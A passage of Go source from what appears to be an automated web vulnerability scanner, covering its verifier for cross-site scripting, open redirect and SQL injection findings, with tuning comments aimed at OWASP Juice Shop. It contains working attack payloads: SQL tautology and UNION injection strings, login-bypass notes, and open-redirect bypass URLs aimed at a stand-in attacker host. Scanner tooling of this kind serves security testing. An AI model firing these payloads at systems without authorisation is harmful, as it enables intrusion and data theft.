			v.db.LogAIWithMetrics(v.scanID, "verifier", "xss_confirmed",
				fmt.Sprintf("%s param:%s", profile.ID, paramName),
				"", baseURL, p.payload, 0, 0, 0)
			return // one confirmed is enough
		}
	}

	// All payloads tested, none reflected
	v.dismissed++
	v.logger.Debug("XSS not confirmed", "endpoint", profile.ID, "param", paramName)

	v.db.InsertNarration(v.scanID, "verifier", "dismissed",
		fmt.Sprintf("Tried %d XSS payloads on '%s' — nothing reflected. Moving on.", len(xssPayloads), paramName),
		baseURL, nil)

	v.db.LogAI(v.scanID, "verifier", "xss_dismissed",
		fmt.Sprintf("%s param:%s - tested %d payloads, no reflection", profile.ID, paramName, len(xssPayloads)),
		"", baseURL, "")
}

func (v *VerifierAgent) tryBrowserXSS(ctx context.Context, rawURL, paramName string) (*browserXSSProof, bool) {
	return v.tryBrowserXSSLimited(ctx, rawURL, paramName, 0)
}

func (v *VerifierAgent) tryBrowserXSSLimited(ctx context.Context, rawURL, paramName string, maxPayloads int) (*browserXSSProof, bool) {
	if v.browser == nil || v.browser.Browser() == nil || paramName == "" {
		return nil, false
	}
	marker := fmt.Sprintf("AOBTD_XSS_%d", time.Now().UnixNano())
	payloads := browserXSSPayloads(marker)
	if maxPayloads > 0 && maxPayloads < len(payloads) {
		payloads = payloads[:maxPayloads]
	}
	for _, payload := range payloads {
		for _, candidate := range browserXSSCandidateURLs(v.target, rawURL, paramName, payload.payload) {
			if ctx.Err() != nil {
				return nil, false
			}
			proof, ok := v.executeBrowserXSSProbe(ctx, candidate, payload, marker)
			if ok {
				return proof, true
			}
		}
	}
	return nil, false
}

func (v *VerifierAgent) executeBrowserXSSProbe(ctx context.Context, candidateURL string, payload browserXSSPayload, marker string) (*browserXSSProof, bool) {
	probeCtx, cancel := context.WithTimeout(ctx, 8*time.Second)
	defer cancel()

	page, err := v.browser.NewPage(probeCtx, "about:blank")
	if err != nil || page == nil {
		return nil, false
	}
	defer page.Close()

	dialogCh := make(chan proto.PageJavascriptDialogOpening, 1)
	go page.Context(probeCtx).EachEvent(func(e *proto.PageJavascriptDialogOpening) {
		if e != nil {
			select {
			case dialogCh <- *e:
			default:
			}
		}
		_ = proto.PageHandleJavaScriptDialog{Accept: false, PromptText: ""}.Call(page)
	})()

	if err := page.Navigate(candidateURL); err != nil {
		return nil, false
	}
	_ = page.Timeout(3 * time.Second).WaitLoad()

	deadline := time.Now().Add(3 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case ev := <-dialogCh:
			msg := strings.TrimSpace(ev.Message)
			if payload.expectedAlert != "" && strings.Contains(msg, payload.expectedAlert) {
				return &browserXSSProof{
					URL:          candidateURL,
					Payload:      payload.payload,
					Kind:         payload.kind,
					Signal:       "JavaScript dialog opened with expected message",
					AlertMessage: msg,
				}, true
			}
			if strings.Contains(msg, marker) {
				return &browserXSSProof{
					URL:          candidateURL,
					Payload:      payload.payload,
					Kind:         payload.kind,
					Signal:       "JavaScript dialog opened with AOBTD marker",
					AlertMessage: msg,
				}, true
			}
		default:
		}

		if browserXSSMarkerPresent(page, marker) {
			return &browserXSSProof{
				URL:     candidateURL,
				Payload: payload.payload,
				Kind:    payload.kind,
				Signal:  "window.__AOBTD_XSS_PROOF__ marker set by injected JavaScript",
			}, true
		}

		select {
		case <-probeCtx.Done():
			return nil, false
		case <-time.After(250 * time.Millisecond):
		}
	}
	return nil, false
}

func browserXSSMarkerPresent(page *rod.Page, marker string) bool {
	if page == nil || strings.TrimSpace(marker) == "" {
		return false
	}
	result, err := page.Timeout(1500 * time.Millisecond).Eval(`() => {
		const values = [];
		try { values.push(String(window.__AOBTD_XSS_PROOF__ || "")); } catch (_) {}
		try { values.push(String(globalThis.__AOBTD_XSS_PROOF__ || "")); } catch (_) {}
		try {
			if (document && document.body) {
				values.push(String(document.body.getAttribute("data-aobtd-xss-proof") || ""));
			}
		} catch (_) {}
		return values.join("|");
	}`)
	if err != nil || result == nil {
		return false
	}
	var observed string
	if err := json.Unmarshal([]byte(result.Value.JSON("", "")), &observed); err != nil {
		observed = result.Value.String()
	}
	return browserXSSObservedMarkerMatches(observed, marker)
}

func browserXSSObservedMarkerMatches(observed, marker string) bool {
	marker = strings.TrimSpace(marker)
	if marker == "" {
		return false
	}
	return strings.Contains(observed, marker)
}

func browserXSSCandidateURLs(targetBase, rawURL, param, payload string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(candidate string) {
		candidate = strings.TrimSpace(candidate)
		candidate = normalizeBrowserXSSCandidateURL(candidate)
		if candidate == "" || seen[candidate] {
			return
		}
		seen[candidate] = true
		out = append(out, candidate)
	}

	if u, ok := urlWithQueryParam(rawURL, param, payload); ok {
		add(u)
	}
	if parsed, err := url.Parse(rawURL); err == nil && parsed.Fragment != "" {
		return out
	}

	origin := originFromURL(rawURL)
	if origin == "" {
		origin = originFromURL(targetBase)
	}
	if origin == "" {
		return out
	}

	path := ""
	if parsed, err := url.Parse(rawURL); err == nil {
		path = parsed.Path
	}
	uiBase := browserXSSUIBase(origin, path)
	if browserXSSLooksSearchLike(path, param) {
		add(urlWithQueryParamMust(uiBase+"/", param, payload))
		add(urlWithQueryParamMust(uiBase+"/search", param, payload))
		add(urlWithHashQueryParam(uiBase, "/search", param, payload))
		add(urlWithHashQueryParam(uiBase, "/", param, payload))
	}

	// If the observed endpoint has a meaningful terminal segment, try it as
	// a UI route too. This bridges API shapes such as /api/search or
	// /rest/products/search to SPA pages without hardcoding any application.
	if last := lastMeaningfulPathSegment(path); last != "" &&
		last != "api" && last != "rest" && last != "v1" && last != "v2" {
		add(urlWithQueryParamMust(uiBase+"/"+last, param, payload))
		add(urlWithHashQueryParam(uiBase, "/"+last, param, payload))
	}

	return out
}

func browserXSSUIBase(origin, path string) string {
	origin = strings.TrimRight(origin, "/")
	if origin == "" {
		return ""
	}
	trimmed := strings.Trim(path, "/")
	if trimmed == "" {
		return origin
	}
	first := strings.Split(trimmed, "/")[0]
	lower := strings.ToLower(first)
	switch lower {
	case "", "api", "apis", "rest", "v1", "v2", "v3", "graphql", "service", "services", "static", "assets":
		return origin
	}
	return origin + "/" + first
}

func normalizeBrowserXSSCandidateURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return rawURL
	}
	escapedPath := parsed.EscapedPath()
	if !strings.Contains(escapedPath, "%25") {
		return rawURL
	}
	decodedOnce, err := url.PathUnescape(escapedPath)
	if err != nil || decodedOnce == "" || !strings.Contains(decodedOnce, "%") {
		return rawURL
	}
	if !looksLikeEncodedHTMLPayload(decodedOnce) {
		return rawURL
	}
	decodedTwice, err := url.PathUnescape(decodedOnce)
	if err != nil || decodedTwice == "" {
		return rawURL
	}
	parsed.Path = decodedTwice
	parsed.RawPath = decodedOnce
	return parsed.String()
}

func looksLikeEncodedHTMLPayload(path string) bool {
	lower := strings.ToLower(path)
	for _, marker := range []string{"%3c", "%3e", "%22", "%27", "%60"} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func urlWithQueryParam(rawURL, param, payload string) (string, bool) {
	parsed, err := url.Parse(rawURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return "", false
	}
	if parsed.Fragment != "" {
		fragPath, fragQuery, hasQuery := strings.Cut(parsed.Fragment, "?")
		if strings.HasPrefix(fragPath, "/") || hasQuery {
			q, err := url.ParseQuery(fragQuery)
			if err != nil {
				q = url.Values{}
			}
			q.Set(param, payload)
			parsed.Fragment = fragPath + "?" + q.Encode()
			return parsed.String(), true
		}
	}
	q := parsed.Query()
	q.Set(param, payload)
	parsed.RawQuery = q.Encode()
	return parsed.String(), true
}

func urlWithQueryParamMust(rawURL, param, payload string) string {
	u, ok := urlWithQueryParam(rawURL, param, payload)
	if !ok {
		return ""
	}
	return u
}

func urlWithHashQueryParam(origin, hashPath, param, payload string) string {
	origin = strings.TrimRight(origin, "/")
	hashPath = "/" + strings.Trim(hashPath, "/")
	if hashPath == "/" {
		hashPath = "/"
	}
	q := url.Values{}
	q.Set(param, payload)
	return origin + "/#" + hashPath + "?" + q.Encode()
}

func originFromURL(rawURL string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	return parsed.Scheme + "://" + parsed.Host
}

func browserXSSLooksSearchLike(path, param string) bool {
	lowerParam := strings.ToLower(param)
	switch lowerParam {
	case "q", "query", "search", "term", "keyword", "s":
		return true
	}
	lowerPath := strings.ToLower(path)
	return strings.Contains(lowerPath, "search") ||
		strings.Contains(lowerPath, "query") ||
		strings.Contains(lowerPath, "find")
}

func responseLooksHTMLExecutable(resp *http.Response, body string) bool {
	if resp == nil {
		return false
	}
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	if strings.Contains(contentType, "text/html") ||
		strings.Contains(contentType, "application/xhtml+xml") ||
		strings.Contains(contentType, "image/svg+xml") {
		return true
	}
	if contentType != "" {
		return false
	}
	trimmed := strings.TrimSpace(strings.ToLower(body))
	return strings.HasPrefix(trimmed, "<!doctype html") ||
		strings.HasPrefix(trimmed, "<html") ||
		strings.HasPrefix(trimmed, "<svg")
}

func lastMeaningfulPathSegment(path string) string {
	parts := strings.Split(strings.Trim(path, "/"), "/")
	for i := len(parts) - 1; i >= 0; i-- {
		part := strings.TrimSpace(parts[i])
		if part == "" || strings.HasPrefix(part, "{") {
			continue
		}
		return part
	}
	return ""
}

// ── Open Redirect Verification ──

func (v *VerifierAgent) verifyOpenRedirect(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	v.tested++

	paramName := extractParamFromIssue(issue)
	if paramName == "" {
		for _, candidate := range []string{"return_to", "redirect", "redirect_uri", "next", "url", "return", "goto", "continue", "dest", "destination"} {
			for _, inp := range profile.Inputs {
				if strings.EqualFold(inp.Name, candidate) {
					paramName = inp.Name
					break
				}
			}
			if paramName != "" {
				break
			}
		}
	}
	if paramName == "" {
		return
	}

	const evilHost = "aobtd-verifier.invalid"
	evilURL := "https://" + evilHost + "/pwned"
	resp, _, err := v.sendGETWithParam(ctx, entry.Request.URL, paramName, evilURL, entry.Request.Headers)
	if err != nil || resp == nil {
		return
	}

	// Check if the Location header actually REDIRECTS to our attacker host
	// (not just contains the attacker host as a query-string value, which was
	// the bug that caused the 33across false-positive on example).
	//
	// Real open redirect: Location: https://aobtd-verifier.invalid/pwned
	// Not open redirect:  Location: https://legit.com/match?ext=https://aobtd-verifier.invalid/pwned
	//                                                        ^ our host is in DATA not in the redirect destination
	//
	// We also use a bespoke invalid-TLD host ("evil.com" is a real domain
	// that could plausibly appear in legitimate third-party redirect chains).
	location := resp.Header.Get("Location")
	if !locationRedirectsToHost(location, evilHost) {
		v.dismissed++
		return
	}
	v.confirmed++
	{

		pocReq := buildXSSRequest("GET", entry.Request.URL, paramName, evilURL, entry.Request.Headers, nil)
		pocResp := fmt.Sprintf("HTTP/1.1 %d %s\nLocation: %s\n\n[redirect body]",
			resp.StatusCode, http.StatusText(resp.StatusCode), location)

		steps := fmt.Sprintf(
			"1. Observe that %s accepts a '%s' parameter.\n"+
				"2. Send this request, replacing '%s' with an attacker-controlled URL:\n\n%s\n\n"+
				"3. Observe the Location header in the %d response — it points to the attacker URL.",
			entry.Request.Path, paramName, paramName, pocReq, resp.StatusCode)

		impact := "Attackers can craft links that appear to point to this trusted host but redirect victims to phishing pages, malware drops, or OAuth-flow-hijack targets. " +
			"Often used to bypass email/URL filters because the initial link is on the legitimate domain."

		remediation := "Never redirect to a user-supplied URL without validation. Maintain an allowlist of permitted destinations (paths or full origins). " +
			"If arbitrary post-login redirects are needed, restrict to same-origin paths only and reject absolute URLs or protocol-relative URLs."

		v.storeFinding(profile, types.Finding{
			Title:            fmt.Sprintf("Open Redirect via '%s' parameter", paramName),
			Description:      fmt.Sprintf("The '%s' parameter on %s redirects to attacker-controlled hosts without validation. Setting the parameter to `%s` produced a Location header whose host matches the attacker-supplied value.", paramName, entry.Request.Path, evilURL),
			Severity:         types.SeverityMedium,
			Confidence:       types.ConfidenceConfirmed,
			VulnType:         "open_redirect",
			ParamName:        paramName,
			Payload:          evilURL,
			PocRequest:       pocReq,
			PocResponse:      pocResp,
			StepsToReproduce: steps,
			Impact:           impact,
			Remediation:      remediation,
			Evidence:         fmt.Sprintf("Parameter: %s\nPayload: %s\nResponse: HTTP %d\nLocation: %s", paramName, evilURL, resp.StatusCode, location),
		})

		v.db.LogAIWithMetrics(v.scanID, "verifier", "redirect_confirmed",
			fmt.Sprintf("%s param:%s", profile.ID, paramName),
			"", entry.Request.URL, location, 0, 0, 0)
	}
}

// locationRedirectsToHost returns true only if `location` (a Location header
// value) causes the browser to navigate to a URL whose host is `targetHost`
// (or a subdomain of it). It parses the URL properly instead of substring-
// matching, which was the bug that let 33across false-positive on
// example: the attacker URL was inside a query parameter, not the host.
//
// Handles:
//   - absolute: "https://aobtd-verifier.invalid/pwned"
//   - protocol-relative: "//aobtd-verifier.invalid/pwned"
//   - case-insensitive host match
//
// Rejects:
//   - Location values that contain the host only as query-string data
//   - relative paths (no host change)
//   - empty / unparseable values
func locationRedirectsToHost(location, targetHost string) bool {
	loc := strings.TrimSpace(location)
	if loc == "" {
		return false
	}
	if parsedLocationRedirectsToHost(loc, targetHost) {
		return true
	}
	if decoded, err := url.PathUnescape(loc); err == nil && decoded != loc {
		decoded = strings.TrimSpace(decoded)
		if strings.HasPrefix(decoded, "///") {
			decoded = "//" + strings.TrimLeft(decoded, "/")
		}
		return parsedLocationRedirectsToHost(decoded, targetHost)
	}
	return false
}

func parsedLocationRedirectsToHost(location, targetHost string) bool {
	loc := strings.TrimSpace(location)
	if loc == "" {
		return false
	}
	// Protocol-relative URLs "//host/…" are absolute from the browser's POV.
	if strings.HasPrefix(loc, "//") {
		loc = "https:" + loc
	}
	u, err := url.Parse(loc)
	if err != nil || u == nil {
		return false
	}
	host := strings.ToLower(u.Hostname())
	want := strings.ToLower(targetHost)
	if host == "" {
		return false // relative path — no redirect target change
	}
	if host == want {
		return true
	}
	// Subdomain match: e.g. "x.aobtd-verifier.invalid" also counts.
	return strings.HasSuffix(host, "."+want)
}

func locationRedirectsToExactURL(location, wantRaw string) bool {
	loc := strings.TrimSpace(location)
	wantRaw = strings.TrimSpace(wantRaw)
	if loc == "" || wantRaw == "" {
		return false
	}
	if strings.HasPrefix(loc, "//") {
		loc = "https:" + loc
	}
	got, err := url.Parse(loc)
	if err != nil || got == nil || got.Hostname() == "" {
		return false
	}
	want, err := url.Parse(wantRaw)
	if err != nil || want == nil || want.Hostname() == "" {
		return false
	}
	got.Fragment = ""
	want.Fragment = ""
	return strings.EqualFold(got.Scheme, want.Scheme) &&
		strings.EqualFold(got.Host, want.Host) &&
		got.EscapedPath() == want.EscapedPath() &&
		got.RawQuery == want.RawQuery
}

type redirectSeed struct {
	URL    string
	Source string
}

var externalHTTPURLRe = regexp.MustCompile(`https?://[^\s"'<>\\]+`)

func (v *VerifierAgent) discoverExternalRedirectSeeds(target string) []redirectSeed {
	entries, err := v.db.GetTrafficByScan(v.scanID)
	if err != nil {
		return nil
	}
	targetHost := ""
	if parsed, err := url.Parse(target); err == nil {
		targetHost = strings.ToLower(parsed.Hostname())
	}

	seen := make(map[string]redirectSeed)
	add := func(raw, source string) {
		normalized, ok := normalizeExternalRedirectSeed(raw, targetHost)
		if !ok {
			return
		}
		if _, exists := seen[normalized]; !exists {
			seen[normalized] = redirectSeed{URL: normalized, Source: source}
		}
	}

	for _, entry := range entries {
		if entry.Request.Query != "" {
			if parsed, err := url.Parse(entry.Request.URL); err == nil {
				for _, values := range parsed.Query() {
					for _, value := range values {
						add(value, "observed query parameter")
					}
				}
			}
		}
		if loc := headerValue(entry.Response.Headers, "Location"); loc != "" {
			add(loc, "observed Location header")
		}
		if len(entry.Response.Body) > 0 && redirectSeedContentType(entry.Response.ContentType) {
			body := string(entry.Response.Body)
			if len(body) > 1024*1024 {
				body = body[:1024*1024]
			}
			for _, raw := range externalHTTPURLRe.FindAllString(body, 80) {
				add(raw, "response body/client code")
			}
		}
	}

	out := make([]redirectSeed, 0, len(seen))
	for _, seed := range seen {
		out = append(out, seed)
	}
	sort.SliceStable(out, func(i, j int) bool {
		si := redirectSeedPriority(out[i])
		sj := redirectSeedPriority(out[j])
		if si != sj {
			return si > sj
		}
		return out[i].URL < out[j].URL
	})
	if len(out) > 24 {
		out = out[:24]
	}
	return out
}

func redirectSeedContentType(contentType string) bool {
	ct := strings.ToLower(contentType)
	return ct == "" ||
		strings.Contains(ct, "text/") ||
		strings.Contains(ct, "javascript") ||
		strings.Contains(ct, "json") ||
		strings.Contains(ct, "xml")
}

func normalizeExternalRedirectSeed(raw, targetHost string) (string, bool) {
	candidate := strings.TrimSpace(raw)
	if candidate == "" {
		return "", false
	}
	candidate = strings.ReplaceAll(candidate, "&amp;", "&")
	candidate = strings.Trim(candidate, " \t\r\n\"'`<>")
	for _, marker := range []string{"<", "\"", "'", "`"} {
		if idx := strings.Index(candidate, marker); idx > len("https://") {
			candidate = candidate[:idx]
		}
	}
	candidate = strings.TrimRight(candidate, ".,;)]}")
	if strings.HasPrefix(candidate, "//") {
		candidate = "https:" + candidate
	}
	parsed, err := url.Parse(candidate)
	if err != nil || parsed == nil {
		return "", false
	}
	if parsed.Scheme != "http" && parsed.Scheme != "https" {
		return "", false
	}
	host := strings.ToLower(parsed.Hostname())
	if host == "" {
		return "", false
	}
	if targetHost != "" && (host == targetHost || strings.HasSuffix(host, "."+targetHost)) {
		return "", false
	}
	parsed.Fragment = ""
	return parsed.String(), true
}

func redirectSeedPriority(seed redirectSeed) int {
	score := 0
	if strings.Contains(seed.Source, "Location") {
		score += 40
	}
	if redirectSeedRiskCategory(seed.URL) != "" {
		score += 35
	}
	parsed, err := url.Parse(seed.URL)
	if err == nil && parsed != nil {
		host := strings.ToLower(parsed.Hostname())
		switch {
		case strings.Contains(host, "github.com"):
			score += 8
		case strings.Contains(host, "paypal") || strings.Contains(host, "stripe"):
			score += 12
		case strings.Contains(host, "cdn") || strings.Contains(host, "fonts") || strings.Contains(host, "gstatic"):
			score -= 8
		}
		if parsed.Path != "" && parsed.Path != "/" {
			score += 4
		}
	}
	return score
}

func redirectSeedRiskCategory(raw string) string {
	parsed, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || parsed == nil {
		return ""
	}
	host := strings.ToLower(parsed.Hostname())
	path := strings.ToLower(parsed.EscapedPath())
	joined := host + " " + path
	cryptoHost := strings.Contains(host, "blockchain") ||
		strings.Contains(host, "etherscan") ||
		strings.Contains(host, "blockchair") ||
		strings.Contains(host, "explorer.") ||
		strings.Contains(host, "bitcoin") ||
		strings.Contains(host, "ethereum") ||
		strings.Contains(host, "crypto")
	if cryptoHost && (strings.Contains(path, "/address/") || strings.Contains(path, "/addr/")) {
		return "cryptocurrency payment/address redirect"
	}
	if strings.Contains(joined, "wallet") && strings.Contains(path, "address") {
		return "wallet/address redirect"
	}
	if strings.Contains(host, "paypal") || strings.Contains(host, "stripe") {
		return "payment-provider redirect"
	}
	return ""
}

func redirectBypassPayloads(attackerHost string, seeds []redirectSeed) []string {
	payloads := []string{
		"http://" + attackerHost + "/",
		"//" + attackerHost + "/",
		"/%2f%2f" + attackerHost + "/",
		"https://trusted.example.com@" + attackerHost + "/",
	}
	seen := map[string]bool{}
	for _, payload := range payloads {
		seen[payload] = true
	}
	for _, seed := range seeds {
		if strings.TrimSpace(seed.URL) == "" {
			continue
		}
		candidates := []string{
			"https://" + attackerHost + "/?next=" + url.QueryEscape(seed.URL),
			"https://" + attackerHost + "/#" + seed.URL,
			"//" + attackerHost + "/?redirect=" + url.QueryEscape(seed.URL),
		}
		for _, candidate := range candidates {
			if seen[candidate] {
				continue
			}
			seen[candidate] = true
			payloads = append(payloads, candidate)
			if len(payloads) >= 24 {
				return payloads
			}
		}
	}
	return payloads
}

// ── SQLi Verification (error-based detection only — safe) ──

var sqliPayloads = []struct {
	payload string
	errors  []string
}{
	// Classic error-based detection. Error-signature list expanded to cover
	// SQLite (which Juice Shop uses — "SQLITE_ERROR", "near X: syntax error"),
	// plus MSSQL / T-SQL phrasings that the prior list missed.
	{`'`, []string{
		"SQL syntax", "mysql_", "pg_query", "sqlite3", "SQLITE_ERROR", "SQLite",
		"ORA-", "unterminated", "syntax error", `near "`,
		"Microsoft OLE DB", "SQLServer",
	}},
	// UNION-style payload specifically targets SQLite-backed search endpoints
	// like Juice Shop's /rest/products/search — the single-quote alone is
	// often swallowed silently (empty result) but the UNION throws.
	{`')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--`, []string{
		"SQL syntax", "SQLITE_ERROR", "SQLite", "sqlite3", `near "`,
		"mysql_", "pg_query", "ORA-", "syntax error",
	}},
	// Boolean-tautology payload returns all rows on vulnerable queries.
	// Detection relies on error signatures; if response is silently extended,
	// we'd need baseline-diff (not implemented yet).
	{`' OR '1'='1`, []string{
		"SQL syntax", "mysql_", "pg_query", "sqlite3", "SQLITE_ERROR",
		`near "`,
	}},
	{`1; SELECT 1--`, []string{"SQL syntax", "mysql_", "pg_query", "SQLITE_ERROR"}},
}

func (v *VerifierAgent) verifySQLi(ctx context.Context, profile types.PageProfile, entry types.TrafficEntry, issue string) {
	v.tested++

	// If this is a login-like endpoint, try login-bypass SQLi specifically.
	// Juice Shop's loginAdminChallenge uses classic `' or 1=1--` in the
	// email field of POST /rest/user/login. Normal SQLi verification sends
	// payloads as query params, which is the wrong vector for login forms.
	if isLoginLikeEndpoint(entry.Request.URL, entry.Request.Method) {
		if v.verifyLoginSQLi(ctx, profile, entry) {
			return
		}
		// fall through to generic SQLi if login bypass didn't trip
	}

	paramName := extractParamFromIssue(issue)
	if paramName == "" {
		for _, inp := range profile.Inputs {
			if inp.Name != "" {
				paramName = inp.Name
				break
			}
		}
	}
	if paramName == "" {
		return
	}

	// Baseline-diff detection: capture the response length for a benign
	// value first, then compare against tautology-payload response length.
	// Juice Shop's /rest/products/search silently returns ALL rows on
	// `' OR 1=1` — no SQL error is emitted, so error-string matching would
	// miss it. The size difference is the signal (baseline ~200 bytes for
	// "notfound", vs ~13KB for all products).
	baselineResp, baselineBody, _ := v.sendGETWithParam(ctx, entry.Request.URL, paramName,
		"aobtd-sqli-probe-baseline-xyz", entry.Request.Headers)
	baselineLen := len(baselineBody)
	if baselineResp == nil {
		baselineLen = -1 // skip diff comparison if baseline request failed
	}

	for _, p := range sqliPayloads {
		if ctx.Err() != nil {
			return
		}

		resp, body, err := v.sendGETWithParam(ctx, entry.Request.URL, paramName, p.payload, entry.Request.Headers)
		if err != nil {
			continue
		}

		bodyLower := strings.ToLower(body)
		for _, errStr := range p.errors {
			if strings.Contains(bodyLower, strings.ToLower(errStr)) {
				v.confirmed++

				pocReq := buildXSSRequest("GET", entry.Request.URL, paramName, p.payload, entry.Request.Headers, nil)
				pocResp := ""
				if resp != nil {
					pocResp = buildPocResponse(resp, body, errStr)
				} else {
					pocResp = fmt.Sprintf("[response not captured]\n\nMatched error string: %s", errStr)
				}

				steps := fmt.Sprintf(
					"1. Observe that %s accepts a '%s' parameter.\n"+
						"2. Send this request with payload `%s` injected into '%s':\n\n%s\n\n"+
						"3. Observe the response body — it contains the database error message '%s', confirming unsanitized input is reaching the SQL query.",
					entry.Request.Path, paramName, p.payload, paramName, pocReq, errStr)

				impact := "A successful SQL injection lets an attacker read, modify, or delete any data the database user can access — often including credentials, session tokens, PII, and audit logs. " +
					"Error-based detection means the query is leaking into the response; a blind or UNION-based follow-up is typically trivial."

				remediation := "Use parameterized queries / prepared statements for every database interaction. Never concatenate or interpolate user input into SQL strings. " +
					"As defense in depth: least-privilege database user, query allowlists at the app layer, and a WAF rule for obvious SQLi patterns."

				v.storeFinding(profile, types.Finding{
					Title:            fmt.Sprintf("SQL Injection in '%s' parameter", paramName),
					Description:      fmt.Sprintf("The '%s' parameter on %s triggers a database error when probed with `%s`. The error string '%s' appears verbatim in the response, confirming that user input reaches the SQL engine without proper parameterization.", paramName, entry.Request.Path, p.payload, errStr),
					Severity:         types.SeverityCritical,
					Confidence:       types.ConfidenceConfirmed,
					VulnType:         "sqli",
					ParamName:        paramName,
					Payload:          p.payload,
					PocRequest:       pocReq,
					PocResponse:      pocResp,
					StepsToReproduce: steps,
					Impact:           impact,
					Remediation:      remediation,
					Evidence:         fmt.Sprintf("Parameter: %s\nPayload: %s\nError detected: %s", paramName, p.payload, errStr),
				})

				v.db.LogAIWithMetrics(v.scanID, "verifier", "sqli_confirmed",
					fmt.Sprintf("%s param:%s", profile.ID, paramName),
					"", entry.Request.URL, errStr, 0, 0, 0)
				return
			}
		}

		// Baseline-diff detection for tautology payloads: if the response is
		// MUCH larger than baseline (a bogus value that should return 0 rows),
		// the tautology probably returned all rows — silent-SQLi signal Juice
		// Shop exhibits on /rest/products/search where no error is emitted.
		if baselineLen >= 0 && strings.Contains(p.payload, "OR") && len(body) > baselineLen*3 && len(body) > 500 {
			v.confirmed++
			pocReq := buildXSSRequest("GET", entry.Request.URL, paramName, p.payload, entry.Request.Headers, nil)
			pocResp := fmt.Sprintf("HTTP %d\nContent-Length: %d\n\n[response body — %d bytes, vs baseline %d bytes for a non-matching query]",
				resp.StatusCode, len(body), len(body), baselineLen)

			steps := fmt.Sprintf(
				"1. Observe that %s accepts a '%s' parameter.\n"+
					"2. Send a benign query (e.g. '%s=aobtd-sqli-probe-baseline-xyz') and note the response size (%d bytes — no matches).\n"+
					"3. Send the same endpoint with payload `%s` injected into '%s':\n\n%s\n\n"+
					"4. Observe the response is ~%dx larger (%d bytes) — the tautology bypassed the filter and returned the full table.",
				entry.Request.Path, paramName, paramName, baselineLen, p.payload, paramName, pocReq,
				len(body)/max1(baselineLen), len(body))

			impact := "Tautology-based SQL injection confirmed via baseline-diff — the database is executing attacker-controlled SQL logic. " +
				"A UNION-based exfiltration follow-up is typically trivial and would leak tables, credentials, and session data."

			remediation := "Parameterize the query. Never concatenate user input into SQL strings. " +
				"If the ORM is legitimate but the user-exposed input is used in a raw-string column (e.g. column name or ORDER BY), add an allowlist."

			v.storeFinding(profile, types.Finding{
				Title: fmt.Sprintf("SQL Injection in '%s' parameter (baseline-diff)", paramName),
				Description: fmt.Sprintf("The '%s' parameter on %s is vulnerable to SQL injection. Payload `%s` caused the response to grow from %d bytes (benign query) to %d bytes, indicating the tautology evaluated TRUE across all rows and the full table leaked.",
					paramName, entry.Request.Path, p.payload, baselineLen, len(body)),
				Severity:         types.SeverityHigh,
				Confidence:       types.ConfidenceConfirmed,
				VulnType:         "sqli",
				ParamName:        paramName,
				Payload:          p.payload,
				PocRequest:       pocReq,
				PocResponse:      pocResp,
				StepsToReproduce: steps,
				Impact:           impact,
				Remediation:      remediation,
				Evidence: fmt.Sprintf("Parameter: %s\nPayload: %s\nBaseline response: %d bytes\nTautology response: %d bytes (%.1fx larger)",
					paramName, p.payload, baselineLen, len(body), float64(len(body))/float64(max1(baselineLen))),
			})
			v.db.LogAIWithMetrics(v.scanID, "verifier", "sqli_confirmed_diff",
				fmt.Sprintf("%s param:%s", profile.ID, paramName),
				"", entry.Request.URL, p.payload, 0, 0, 0)
			return
		}
	}

	v.dismissed++
}

// max1 returns max(n, 1). Used as a safe divisor in baseline-diff
// calculations where an empty baseline would otherwise divide-by-zero.
func max1(n int) int {
	if n < 1 {
		return 1
	}
	return n
}

type querySQLiTarget struct {
	URL   string
	Path  string
	Param string
}

func (v *VerifierAgent) probeQuerySQLi(ctx context.Context, target string) {
	candidates := v.querySQLiProbeTargets(ctx, target)
	if len(candidates) == 0 {
		return
	}
	exec := reasoner.NewExecutor(v.client, v.db, v.scanID, v.logger)
	payloads := []string{
		`'`,
		`1'`,
		`#`,
		`1 OR id=#`,
		`1 OR id=2`,
		`100 OR 2=2`,
		`1 AND 1=2`,
		`100'OR '1'='1`,
		`1'AND '1'='2`,
		`' OR '1'='1`,
		`admin' OR '1'='1`,
		`')) OR 1=1--`,
		`') OR 1=1--`,
		`" OR "1"="1`,
		`") OR 1=1--`,
		`5 UNION SELECT 1,'AOBTD_SQLI_MARK','AOBTD_SQLI_MARK'`,
		`5' UNION SELECT 1,'AOBTD_SQLI_MARK','AOBTD_SQLI_MARK`,
		`5' UNION SELECT 1,'AOBTD_SQLI_MARK','AOBTD_SQLI_MARK'--`,
	}
	for _, candidate := range candidates {
		if ctx.Err() != nil {
			return
		}
		plan := reasoner.ProbePlan{
			Technique: "sqli_generic",
			Target: reasoner.ProbeTarget{
				URL:    candidate.URL,
				Method: "GET",
				Field:  candidate.Param,
			},
			Payloads: payloads,
			Confirmation: reasoner.ConfirmationRule{
				StatusCodes: []int{http.StatusOK},
			},
			Rationale: fmt.Sprintf("Verifier observed search/list-style query parameter %q on %s and is running a bounded baseline-diff SQLi probe before attempting UNION impact proof.",
				candidate.Param, candidate.Path),
			Confidence:     0.82,
			SourceReasoner: "VerifierProactive",
		}
		v.db.InsertNarration(v.scanID, "verifier", "attempt",
			fmt.Sprintf("Proactive query SQLi probe against %s parameter `%s` — baseline diff first, UNION exfil only after confirmation.",
				candidate.Path, candidate.Param),
			candidate.URL, nil)
		v.tested++
		confirmed, err := exec.ExecutePlan(ctx, plan)
		if err != nil {
			v.dismissed++
			continue
		}
		if confirmed {
			v.confirmed++
		} else {
			v.dismissed++
		}
	}
}

func (v *VerifierAgent) querySQLiProbeTargets(ctx context.Context, target string) []querySQLiTarget {
	seen := make(map[string]bool)
	const maxQuerySQLiTargets = 32
	out := make([]querySQLiTarget, 0, maxQuerySQLiTargets)
	add := func(rawURL, path, param string) {
		param = strings.TrimSpace(param)
		if rawURL == "" || param == "" || !querySQLiTargetLooksRelevant(path, param) {
			return
		}
